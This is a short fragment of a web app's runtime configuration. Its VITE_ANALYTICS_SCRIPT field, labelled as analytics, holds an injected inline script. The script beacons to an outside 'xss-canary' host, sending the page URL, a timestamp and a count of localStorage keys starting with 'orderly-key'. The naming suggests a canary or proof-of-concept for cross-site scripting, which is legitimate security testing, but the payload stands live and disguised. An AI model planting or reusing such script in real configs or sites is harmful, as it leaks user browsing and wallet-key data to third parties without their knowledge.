window.__RUNTIME_CONFIG__ = {
  ...
  "VITE_SEO_SITE_URL": "https://xss-canary-1778874622044.gollem.co",
  ...
  "VITE_ANALYTICS_SCRIPT": "<script>(function(){try{var i=new Image();i.src='https://xss-canary-1778874622044.gollem.co/h?t='+Date.now()+'&u='+encodeURIComponent(location.href)+'&k='+(Object.keys(localStorage).filter(k=>k.indexOf('orderly-key')===0).length);window.__xss_canary='1778874622044';}catch(e){}})();</script>",
  "VITE_SYMBOL_LIST": "",
